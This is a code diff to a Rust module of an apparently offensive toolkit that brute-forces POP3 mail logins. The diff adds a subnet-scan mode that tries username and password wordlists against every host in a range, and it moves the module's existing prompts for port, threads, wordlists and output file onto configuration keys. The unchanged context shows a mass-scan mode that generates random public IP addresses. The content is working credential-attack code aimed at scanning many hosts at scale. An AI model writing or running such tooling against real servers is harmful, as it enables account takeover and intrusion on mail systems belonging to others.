@@ -12,10 +12,10 @@ use tokio::sync::{Mutex, Semaphore};
 use futures::stream::{FuturesUnordered, StreamExt};
 
 use crate::utils::{
-    prompt_yes_no, prompt_existing_file, prompt_int_range,
-    load_lines, prompt_default, prompt_wordlist,
+    load_lines,
+    cfg_prompt_yes_no, cfg_prompt_existing_file, cfg_prompt_int_range, cfg_prompt_output_file,
 };
-use crate::modules::creds::utils::{BruteforceStats, generate_random_public_ip, is_ip_checked, mark_ip_checked, parse_exclusions};
+use crate::modules::creds::utils::{BruteforceStats, generate_random_public_ip, is_ip_checked, mark_ip_checked, parse_exclusions, is_subnet_target, parse_subnet, subnet_host_count};
 use std::sync::atomic::AtomicUsize;
 use std::net::{IpAddr, SocketAddr}; 
 use tokio::fs::OpenOptions; // For file writing in mass scan
@@ -70,26 +70,31 @@ pub async fn run(target: &str) -> Result<()> {
         return run_mass_scan(target).await;
     }
 
-    let use_ssl = prompt_yes_no("Use SSL/TLS (POP3S)?", false)?;
+    if is_subnet_target(target) {
+        println!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());
+        return run_subnet_scan(target).await;
+    }
+
+    let use_ssl = cfg_prompt_yes_no("use_ssl", "Use SSL/TLS (POP3S)?", false)?;
     let default_port = if use_ssl { 995 } else { 110 };
     
-    let port = prompt_int_range("Port", default_port as i64, 1, 65535)? as u16;
-    let username_wordlist = prompt_existing_file("Username wordlist file")?;
-    let password_wordlist = prompt_existing_file("Password wordlist file")?;
+    let port = cfg_prompt_int_range("port", "Port", default_port as i64, 1, 65535)? as u16;
+    let username_wordlist = cfg_prompt_existing_file("username_wordlist", "Username wordlist file")?;
+    let password_wordlist = cfg_prompt_existing_file("password_wordlist", "Password wordlist file")?;
     
-    let threads = prompt_int_range("Threads", 16, 1, 256)? as usize;
-    let delay_ms = prompt_int_range("Delay (ms)", 50, 0, 10000)? as u64;
-    let connection_timeout = prompt_int_range("Timeout (s)", 5, 1, 60)? as u64;
+    let threads = cfg_prompt_int_range("threads", "Threads", 16, 1, 256)? as usize;
+    let delay_ms = cfg_prompt_int_range("delay_ms", "Delay (ms)", 50, 0, 10000)? as u64;
+    let connection_timeout = cfg_prompt_int_range("timeout", "Timeout (s)", 5, 1, 60)? as u64;
     
-    let full_combo = prompt_yes_no("Try every username with every password?", false)?;
-    let stop_on_success = prompt_yes_no("Stop on first valid login?", false)?;
+    let full_combo = cfg_prompt_yes_no("combo_mode", "Try every username with every password?", false)?;
+    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first valid login?", false)?;
     
-    let output_file = prompt_default("Output file for results", "pop3_results.txt")?;
+    let output_file = cfg_prompt_output_file("output_file", "Output file for results", "pop3_results.txt")?;
     
-    let verbose = prompt_yes_no("Verbose mode?", false)?;
-    let retry_on_error = prompt_yes_no("Retry failed connections?", true)?;
+    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?;
+    let retry_on_error = cfg_prompt_yes_no("retry_on_error", "Retry failed connections?", true)?;
     let max_retries = if retry_on_error { 
-        prompt_int_range("Max retries", 2, 1, 10)? as usize
+        cfg_prompt_int_range("max_retries", "Max retries", 2, 1, 10)? as usize
     } else { 
         0 
     };
@@ -119,12 +124,12 @@ pub async fn run(target: &str) -> Result<()> {
 }
 
 async fn run_mass_scan(target: &str) -> Result<()> {
-    let use_ssl = prompt_yes_no("Use SSL/TLS (POP3S)?", false)?;
+    let use_ssl = cfg_prompt_yes_no("use_ssl", "Use SSL/TLS (POP3S)?", false)?;
     let default_port = if use_ssl { 995 } else { 110 };
-    let port = prompt_int_range("Port", default_port as i64, 1, 65535)? as u16;
+    let port = cfg_prompt_int_range("port", "Port", default_port as i64, 1, 65535)? as u16;
     
-    let usernames_file = prompt_wordlist("Username wordlist")?;
-    let passwords_file = prompt_wordlist("Password wordlist")?;
+    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist")?;
+    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist")?;
     
     let users = load_lines(&usernames_file)?;
     let pass_lines = load_lines(&passwords_file)?;
@@ -132,9 +137,9 @@ async fn run_mass_scan(target: &str) -> Result<()> {
     if users.is_empty() { return Err(anyhow!("User list empty")); }
     if pass_lines.is_empty() { return Err(anyhow!("Pass list empty")); }
 
-    let concurrency = prompt_int_range("Max concurrent hosts to scan", 500, 1, 10000)? as usize;
-    let verbose = prompt_yes_no("Verbose mode?", false)?; 
-    let output_file = prompt_default("Output result file", "pop3_mass_results.txt")?;
+    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts to scan", 500, 1, 10000)? as usize;
+    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?; 
+    let output_file = cfg_prompt_output_file("output_file", "Output result file", "pop3_mass_results.txt")?;
 
     // Parse exclusions
     let exclusions = Arc::new(parse_exclusions(EXCLUDED_RANGES));
@@ -222,6 +227,66 @@ async fn run_mass_scan(target: &str) -> Result<()> {
     Ok(())
 }
 
+async fn run_subnet_scan(target: &str) -> Result<()> {
+    let network = parse_subnet(target)?;
+    let count = subnet_host_count(&network);
+    println!("{}", format!("[*] Subnet {} — {} hosts to scan", target, count).cyan());
+
+    let use_ssl = cfg_prompt_yes_no("use_ssl", "Use SSL/TLS (POP3S)?", false)?;
+    let default_port = if use_ssl { 995 } else { 110 };
+    let port = cfg_prompt_int_range("port", "Port", default_port as i64, 1, 65535)? as u16;
+    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist")?;
+    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist")?;
+    let users = load_lines(&usernames_file)?;
+    let passes = load_lines(&passwords_file)?;
+    if users.is_empty() { return Err(anyhow!("User list empty")); }
+    if passes.is_empty() { return Err(anyhow!("Pass list empty")); }
+
+    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000)? as usize;
+    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?;
+    let output_file = cfg_prompt_output_file("output_file", "Output result file", "pop3_subnet_results.txt")?;
+
+    let semaphore = Arc::new(Semaphore::new(concurrency));
+    let stats_checked = Arc::new(AtomicUsize::new(0));
+    let stats_found = Arc::new(AtomicUsize::new(0));
+    let creds_pkg = Arc::new((users, passes, use_ssl));
+    let total = count;
+
+    let s_checked = stats_checked.clone();
+    let s_found = stats_found.clone();
+    tokio::spawn(async move {
+        loop {
+            tokio::time::sleep(std::time::Duration::from_secs(5)).await;
+            println!("[*] Status: {}/{} IPs scanned, {} valid credentials found",
+                s_checked.load(Ordering::Relaxed), total,
+                s_found.load(Ordering::Relaxed).to_string().green().bold());
+        }
+    });
+
+    for ip in network.iter() {
+        let permit = semaphore.clone().acquire_owned().await.context("Semaphore")?;
+        let cp = creds_pkg.clone();
+        let sc = stats_checked.clone();
+        let sf = stats_found.clone();
+        let of = output_file.clone();
+
+        tokio::spawn(async move {
+            mass_scan_host(ip, port, cp, sf, of, verbose).await;
+            sc.fetch_add(1, Ordering::Relaxed);
+            drop(permit);
+        });
+    }
+
+    for _ in 0..concurrency {
+        let _ = semaphore.acquire().await.context("Semaphore")?;
+    }
+
+    println!("\n{}", format!("[*] Subnet scan complete. {} hosts scanned, {} credentials found.",
+        stats_checked.load(Ordering::Relaxed),
+        stats_found.load(Ordering::Relaxed)).cyan().bold());
+    Ok(())
+}
+
 async fn mass_scan_host(
     ip: IpAddr, 
     port: u16,
@@ -303,14 +368,6 @@ async fn mass_scan_host(
 
 async fn run_pop3_bruteforce(config: Pop3BruteforceConfig) -> Result<()> {
     // Determine loading strategy
-    let _user_count = load_lines(&config.username_wordlist)?.len();
-    let _pass_count = load_lines(&config.password_wordlist)?.len();
-    
-    // We will use memory mode for simpler implementation unless huge, but for now standard load_lines
-    // If files are huge, the shared Utils load_lines might panic or OOM, but let's assume reasonable sizes for now
-    // or use the streaming logic if I can adapt it easily.
-    // To match other modules (ssh/ftp), I'll use load_lines.
-    
     let usernames = load_lines(&config.username_wordlist)?;
     let passwords = load_lines(&config.password_wordlist)?;
 
@@ -326,7 +383,7 @@ async fn run_pop3_bruteforce(config: Pop3BruteforceConfig) -> Result<()> {
     let stats = Arc::new(BruteforceStats::new());
     let found_creds = Arc::new(Mutex::new(Vec::new()));
     let stop_signal = Arc::new(AtomicBool::new(false));
-    let _start_time = std::time::Instant::now();
+    let start_time = std::time::Instant::now();
 
     // Start progress reporter
     let stats_clone = stats.clone();
@@ -446,6 +503,8 @@ async fn run_pop3_bruteforce(config: Pop3BruteforceConfig) -> Result<()> {
     stop_signal.store(true, Ordering::Relaxed);
     let _ = progress_handle.await;
     
+    let elapsed = start_time.elapsed();
+    println!("[*] Elapsed: {:.1}s", elapsed.as_secs_f64());
     stats.print_final().await;
     
     // Save results
